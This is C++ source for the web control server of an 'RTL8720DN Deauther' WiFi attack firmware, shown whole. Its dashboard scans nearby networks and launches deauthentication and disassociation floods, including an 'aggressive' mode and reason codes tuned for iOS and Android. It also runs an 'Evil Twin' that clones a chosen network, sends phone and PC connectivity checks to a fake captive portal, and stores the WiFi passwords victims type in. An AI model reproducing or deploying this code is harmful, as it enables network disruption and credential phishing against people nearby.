#include "web_server.h"
#include "web_pages.h"
#include "attack.h"
#include "evil_twin.h"
#include "flash_storage.h"
#include "dns_server.h"

WiFiServer server(80);

String parseRequest(String request) {
  if (request.length() == 0) return "";
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  String path = request.substring(path_start, path_end);
  path.trim();
  return path;
}

std::vector<std::pair<String, String>> parsePost(String &request) {
  std::vector<std::pair<String, String>> post_params;
  int body_start = request.indexOf("\r\n\r\n");
  if (body_start == -1) return post_params;
  body_start += 4;
  String post_data = request.substring(body_start);
  int start = 0;
  int end = post_data.indexOf('&', start);
  while (end != -1) {
    String kv = post_data.substring(start, end);
    int delim = kv.indexOf('=');
    if (delim != -1) {
      post_params.push_back({kv.substring(0, delim), kv.substring(delim + 1)});
    }
    start = end + 1;
    end = post_data.indexOf('&', start);
  }
  String kv = post_data.substring(start);
  int delim = kv.indexOf('=');
  if (delim != -1) {
    post_params.push_back({kv.substring(0, delim), kv.substring(delim + 1)});
  }
  return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\r\n";
  response += "Content-Type: " + content_type + "\r\n";
  response += "Cache-Control: no-cache\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

// Helper: send chunk for chunked transfer encoding
void sendChunkData(WiFiClient &client, const String &data) {
  if (data.length() == 0) return;
  char hexSize[10];
  sprintf(hexSize, "%x", data.length());
  client.println(hexSize);
  client.print(data);
  client.println();
}

// Send raw string directly (for static content)
void sendChunkRaw(WiFiClient &client, const char* data) {
  int len = strlen(data);
  if (len == 0) return;
  char hexSize[10];
  sprintf(hexSize, "%x", len);
  client.println(hexSize);
  client.print(data);
  client.println();
}

// Build and send table rows directly (no intermediate String)
void sendTableRows(WiFiClient &client, bool useRadio) {
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    String ssid = scan_results[i].ssid;
    bool hidden = ssid.length() == 0;
    if (hidden) ssid = "Hidden";
    
    String sigCls = getSigClass(scan_results[i].rssi);
    bool is5 = scan_results[i].channel >= 36;
    
    String row = "<tr><td><input type='";
    row += useRadio ? "radio" : "checkbox";
    row += "' name='net' value='" + String(i) + "' class='chk'></td>";
    row += "<td class='ssid" + String(hidden ? " hidden" : "") + "'>" + ssid + "</td>";
    row += "<td class='mono'>" + scan_results[i].bssid_str.substring(0, 8) + "</td>";
    row += "<td>" + String(scan_results[i].channel) + "</td>";
    row += "<td class='" + sigCls + "'>" + String(scan_results[i].rssi) + "</td>";
    row += "<td class='" + String(is5 ? "b5" : "b2") + "'>" + String(is5 ? "5G" : "2.4") + "</td></tr>";
    
    sendChunkData(client, row);
  }
}

void handleRoot(WiFiClient &client) {
  // Send HTTP headers for chunked transfer
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: text/html; charset=utf-8");
  client.println("Transfer-Encoding: chunked");
  client.println("Connection: close");
  client.println();
  
  // Chunk 1: HTML Header + CSS
  sendChunkData(client, getHtmlHeader("RTL8720DN Deauther"));
  
  // Chunk 2: Page header with brand and status
  String hdr = "<div class='hdr'><div class='hdr-top'><div class='brand'>";
  hdr += "<div class='brand-icon'>📡</div>";
  hdr += "<div class='brand-text'><h1>RTL8720DN</h1><span>WiFi Security Tool</span></div></div>";
  hdr += getStatusBadge(currentState);
  hdr += "</div>";
  sendChunkData(client, hdr);
  
  // Chunk 3: Stats
  String stats = "<div class='stats'>";
  stats += "<div class='stat'><div class='stat-val'>" + String(scan_results.size()) + "</div><div class='stat-lbl'>Networks</div></div>";
  stats += "<div class='stat'><div class='stat-val'>" + String((totalFramesSent24 + totalFramesSent5) / 1000) + "K</div><div class='stat-lbl'>Frames Sent</div></div>";
  stats += "<div class='stat'><div class='stat-val'>" + String(credentialCount) + "</div><div class='stat-lbl'>Captured</div></div>";
  stats += "</div>";
  sendChunkData(client, stats);
  
  // Chunk 4: Toolbar
  String tools = "<div class='tools'>";
  tools += "<form method='post' action='/scan'><button class='btn btn-ghost' style='width:100%'>🔍 Scan</button></form>";
  tools += "<form method='post' action='/led'><button class='btn btn-ghost' style='width:100%'>💡 LED</button></form>";
  tools += "<button class='btn btn-ghost' style='width:100%' onclick='toggle(\"creds\")'>🔑 Keys</button>";
  if (currentState != STATE_IDLE) {
    tools += "<form method='post' action='/stop'><button class='btn btn-red' style='width:100%'>⏹ Stop</button></form>";
  }
  tools += "</div></div>";
  sendChunkData(client, tools);
  
  // Chunk 5: Credentials section
  String creds = "<div id='creds' style='display:none'>";
  if (credentialCount > 0) {
    creds += "<div class='card-h'><span class='icon'>🔑</span> Captured Credentials</div>";
    creds += "<div class='tbl-wrap'><div class='tbl-scroll'><table>";
    creds += "<thead><tr><th>#</th><th>SSID</th><th>Password</th></tr></thead><tbody>";
    creds += getCredentialsHTML();
    creds += "</tbody></table></div></div>";
    creds += "<form method='post' action='/clear' style='margin-top:8px'><button class='btn btn-red btn-block'>🗑️ Clear All</button></form>";
  } else {
    creds += "<div class='card-h'><span class='icon'>🔑</span> No Credentials Yet</div>";
  }
  creds += "</div>";
  sendChunkData(client, creds);
  
  // Chunk 6: Tabs header
  sendChunkRaw(client, "<div class='card'><div class='tabs'><div class='tab active' data-t='deauth' onclick='tab(\"deauth\")'>⚡ Deauth</div><div class='tab' data-t='evil' onclick='tab(\"evil\")'>👿 Evil Twin</div></div>");
  
  // Chunk 7: Deauth tab - table header
  String deauthStart = "<div id='deauth' class='tab-body active'><form method='post' action='/action'>";
  deauthStart += "<div class='tbl-wrap'><div class='sel-all'><input type='checkbox' class='chk' id='sa' onchange='toggleAll(this)'><label for='sa'>Select all (" + String(scan_results.size()) + ")</label></div>";
  deauthStart += "<div class='tbl-scroll'><table><thead><tr><th></th><th>SSID</th><th>BSSID</th><th>CH</th><th>dBm</th><th>Band</th></tr></thead><tbody>";
  sendChunkData(client, deauthStart);
  
  // Chunk 8-N: Table rows (sent one by one)
  sendTableRows(client, false);
  
  // Chunk: Deauth tab - form controls
  String deauthEnd = "</tbody></table></div></div>";
  deauthEnd += "<div class='form-group' style='margin-top:16px'><label>Attack Mode</label><select name='mode'>";
  deauthEnd += "<option value='combo'>⚔️ Combo</option><option value='deauth'>📤 Deauth</option>";
  deauthEnd += "<option value='disassoc'>📴 Disassoc</option><option value='aggressive'>💥 Aggressive</option></select></div>";
  deauthEnd += "<div class='form-group'><label>Reason Codes</label><select name='reason'>";
  deauthEnd += "<option value='all'>All (22)</option><option value='standard'>Standard (8)</option>";
  deauthEnd += "<option value='ios'>iOS (9)</option><option value='android'>Android (8)</option></select></div>";
  deauthEnd += "<button type='submit' name='act' value='deauth' class='btn btn-green btn-block'>🚀 Launch Attack</button></form></div>";
  sendChunkData(client, deauthEnd);
  
  // Chunk: Evil Twin tab
  String evil = "<div id='evil' class='tab-body'>";
  if (currentState == STATE_EVIL_TWIN) {
    evil += "<div class='evil-on'><h3>☠️ Evil Twin Active</h3>";
    evil += "<p>Cloning: <strong>" + evilTwinSSID + "</strong></p>";
    evil += "<form method='post' action='/stop' style='margin-top:12px'><button class='btn btn-red'>⏹ Stop</button></form></div>";
  } else {
    evil += "<form method='post' action='/action'>";
    evil += "<div class='tbl-wrap'><div class='sel-all' style='color:var(--c-text2);font-size:11px'>⚠️ Select ONE network</div>";
    evil += "<div class='tbl-scroll'><table><thead><tr><th></th><th>SSID</th><th>BSSID</th><th>CH</th><th>dBm</th><th>Band</th></tr></thead><tbody>";
    sendChunkData(client, evil);
    
    // Send radio table rows
    sendTableRows(client, true);
    
    evil = "</tbody></table></div></div>";
    evil += "<button type='submit' name='act' value='evil' class='btn btn-red btn-block' style='margin-top:16px'>👿 Start Evil Twin</button></form>";
  }
  evil += "</div></div>";
  sendChunkData(client, evil);
  
  // Final chunk: Footer
  sendChunkData(client, getHtmlFooter());
  
  // End chunked transfer
  client.println("0");
  client.println();
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain") + "Not found";
  client.write(response.c_str());
}

void WebServerTask(void *pvParameters) {
  (void) pvParameters;
  server.begin();
  
  while (1) {
    // DNS is handled by lwIP callbacks - no need to call processDNS()
    
    WiFiClient client = server.available();
    if (client && client.connected()) {
      String request;
      unsigned long timeout = millis() + 1000;
      while (client.available() && millis() < timeout) {
        request += (char)client.read();
        vTaskDelay(pdMS_TO_TICKS(1));
      }
      
      if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
        client.stop();
        continue;
      }
      
      String path = parseRequest(request);
      
      // 1. Handle Admin/Control paths FIRST (Always accessible)
      bool handled = false;
      
      if (path == "/" || path == "/index.html" || path == "/admin" || path.indexOf("admin") >= 0) {
        handleRoot(client);
        handled = true;
      } else if (path == "/scan") {
        scanNetworks();
        handleRoot(client);
        handled = true;
      } else if (path == "/stop") {
        if (evilTwinActive) stopEvilTwin();
        attack_targets_24.clear();
        attack_targets_5.clear();
        currentState = STATE_IDLE;
        handleRoot(client);
        handled = true;
      } else if (path == "/led") {
        ledEnabled = !ledEnabled;
        if (!ledEnabled) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
        }
        handleRoot(client);
        handled = true;
      } else if (path == "/clear") {
        clearCredentialsFromFlash();
        handleRoot(client);
        handled = true;
      } else if (path == "/action") {
        std::vector<std::pair<String, String>> post_data = parsePost(request);
        String action = "";
        
        for (auto &p : post_data) {
          if (p.first == "act") { action = p.second; break; }
        }
        
        for (auto &p : post_data) {
          if (p.first == "mode") {
            if (p.second == "deauth") currentAttackMode = ATTACK_DEAUTH_ONLY;
            else if (p.second == "disassoc") currentAttackMode = ATTACK_DISASSOC_ONLY;
            else if (p.second == "aggressive") currentAttackMode = ATTACK_AGGRESSIVE;
            else currentAttackMode = ATTACK_COMBO;
          }
          if (p.first == "reason") {
            if (p.second == "standard") { activeReasons = REASONS_STANDARD; activeReasonCount = REASONS_STANDARD_COUNT; }
            else if (p.second == "ios") { activeReasons = REASONS_IOS; activeReasonCount = REASONS_IOS_COUNT; }
            else if (p.second == "android") { activeReasons = REASONS_ANDROID; activeReasonCount = REASONS_ANDROID_COUNT; }
            else { activeReasons = REASONS_ALL; activeReasonCount = REASONS_ALL_COUNT; }
          }
        }
        
        std::vector<int> selectedNets;
        for (auto &p : post_data) {
          if (p.first == "net") {
            int idx = p.second.toInt();
            if (idx >= 0 && idx < (int)scan_results.size()) {
              selectedNets.push_back(idx);
            }
          }
        }
        
        if (action == "deauth" && !selectedNets.empty()) {
          attack_targets_24.clear();
          attack_targets_5.clear();
          for (int idx : selectedNets) {
            if (scan_results[idx].channel >= 36)
              attack_targets_5.push_back(idx);
            else
              attack_targets_24.push_back(idx);
          }
          sortTargetsByChannel(attack_targets_24);
          sortTargetsByChannel(attack_targets_5);
          currentState = STATE_ATTACK;
        } else if (action == "evil" && !selectedNets.empty()) {
          startEvilTwin(selectedNets[0]);
        }
        
        handleRoot(client);
        handled = true;
      } else if (path == "/submit") {
        // Explicit submission handler
        handlePasswordSubmit(client, request);
        handled = true;
      }
      
      // 2. If not handled and Evil Twin is active -> Captive Portal Catch-All
      if (!handled && evilTwinActive && currentState == STATE_EVIL_TWIN) {
        // Redirect known OS checks to 302 Found -> /portal
        if (path.indexOf("generate_204") >= 0 || path.indexOf("gen_204") >= 0 ||
            path.indexOf("connectivitycheck") >= 0 || path.indexOf("gstatic") >= 0 ||
            path.indexOf("hotspot-detect") >= 0 || path.indexOf("captive.apple") >= 0 || 
            path.indexOf("library/test/success") >= 0 ||
            path.indexOf("ncsi") >= 0 || path.indexOf("connecttest") >= 0 || 
            path.indexOf("msftconnecttest") >= 0 || path.indexOf("msftncsi") >= 0 ||
            path.indexOf("detectportal") >= 0 || path.indexOf("success.txt") >= 0) {
              
           client.print("HTTP/1.1 302 Found\r\nLocation: http://192.168.1.1/portal\r\nCache-Control: no-cache\r\nConnection: close\r\n\r\n");
        } else {
           // Show portal page for any other URL (e.g. google.com)
           handleCaptivePortal(client);
        }
        handled = true;
      }

      // 3. If still not handled -> 404
      if (!handled) {
        handle404(client);
      }
      
      client.stop();
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}
